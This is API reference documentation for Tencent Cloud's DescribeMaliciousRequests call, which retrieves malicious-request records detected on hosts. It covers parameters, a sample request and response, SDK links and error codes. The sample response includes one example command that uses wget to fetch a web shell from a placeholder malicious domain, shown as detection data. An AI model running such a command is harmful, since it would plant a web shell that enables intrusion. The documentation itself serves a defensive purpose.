## 1. API Description

Domain name for API request: yunjing.tencentcloudapi.com.

This API (DescribeMaliciousRequests) is used to obtain malicious request information.

Default request rate limit: 20/sec.

## 2. Input Parameters

The following request parameter list only provides API request parameters and some common parameters. For the complete common parameter list, see [Common Request Parameters](/document/api/296/19828).

| Parameter Name | Required | Type | Description |
|---------|---------|---------|---------|
| Action | Yes | String | Common parameter. The value​used for this API: DescribeMaliciousRequests. |
| Version | Yes | String | Common parameter. The value used for this API: 2/28/2018 |
| Region | No | String | Common parameter. This parameter is not required for this API. |
| Limit | No | Integer | Number of returned results. It defaults to 10. The maximum is 100. |
| Offset | No | Integer | Offset. It defaults to 0. |
| Filters.N | No | Array of [Filter](/document/api/296/19867#Filter) | Filter condition.<br/><li>Status - String - Required: No - Filter by status (UN_OPERATED: Pending &#124; TRUSTED: Trusted &#124; UN_TRUSTED: Untrusted)</li><li>Domain - String - Required: No - Domain name of the malicious request</li><li>MachineIp - String - Required: No - Host private IP</li> |
| Uuid | No | String | Unique UUID of the HS client. |

## 3. Output Parameters

| Parameter Name | Type | Description |
|---------|---------|---------|
| TotalCount | Integer | Total number of records. |
| MaliciousRequests | Array of [MaliciousRequest](/document/api/296/19867#MaliciousRequest) | Array of malicious request records. |
| RequestId | String | The unique ID of a request, which is required for each troubleshooting case. |

## 4. Example

### Example 1 Obtain malicious request information

#### Input example

```
https://yunjing.tencentcloudapi.com/?Action=DescribeMaliciousRequests
&Limit=10
&Offset=0
&<Common request parameters>
```

#### Output example

```
{
  "Response": {
    "MaliciousRequests": [
      {
        "Count": 10,
        "Status": "UN_OPERATED",
        "Domain": "www.malicious_domain.com",
        "Uuid": "add4a78a-0d59-11e8-b7ab-00e081e1a5c5",
        "Reference": "reference",
        "CmdLine": "wget http://www.malicious_domain.com/webshell.php",
        "MachineName": "machienname",
        "Pid": 5577,
        "Id": 1,
        "ProcessName": "wget",
        "ProcessMd5": "ab0ffdb812fab5a0e1e8b83d39c63ce9",
        "MergeTime": "2018-10-10 10:11:12",
        "CreateTime": "2018-10-10 10:11:12",
        "MachineIp": "10.10.1.1",
        "Description": "description"
      }
    ],
    "RequestId": "354f4ac3-8546-4516-8c8a-69e3ab73aa8a",
    "TotalCount": 100
  }
}
```


## 5. Resources for Developers

### API Explorer

**This tool allows online call, signature authentication, SDK code generation and quick search of APIs to greatly improve the efficiency of using cloud APIs.**

* [API 3.0 Explorer](https://console.cloud.tencent.com/api/explorer?Product=yunjing&Version=2018-02-28&Action=DescribeMaliciousRequests)

### SDK

Cloud API 3.0 comes with the software development kit (SDK) that supports multiple programming languages and makes it easier to call the APIs.

* [Tencent Cloud SDK 3.0 for Python](https://github.com/TencentCloud/tencentcloud-sdk-python)
* [Tencent Cloud SDK 3.0 for Java](https://github.com/TencentCloud/tencentcloud-sdk-java)
* [Tencent Cloud SDK 3.0 for PHP](https://github.com/TencentCloud/tencentcloud-sdk-php)
* [Tencent Cloud SDK 3.0 for Go](https://github.com/TencentCloud/tencentcloud-sdk-go)
* [Tencent Cloud SDK 3.0 for NodeJS](https://github.com/TencentCloud/tencentcloud-sdk-nodejs)
* [Tencent Cloud SDK 3.0 for .NET](https://github.com/TencentCloud/tencentcloud-sdk-dotnet)

### Command line tools

* [Tencent Cloud CLI 3.0](https://cloud.tencent.com/document/product/440/6176)

## 6. Error Codes

The following only lists the error codes related to this API. For other error codes, see [Common Error Codes](/document/api/296/19830#.E5.85.AC.E5.85.B1.E9.94.99.E8.AF.AF.E7.A0.81).

| Error Code | Description |
|---------|---------|
| InternalError | Internal error. |
| InvalidParameter.IllegalRequest | Invalid request. |

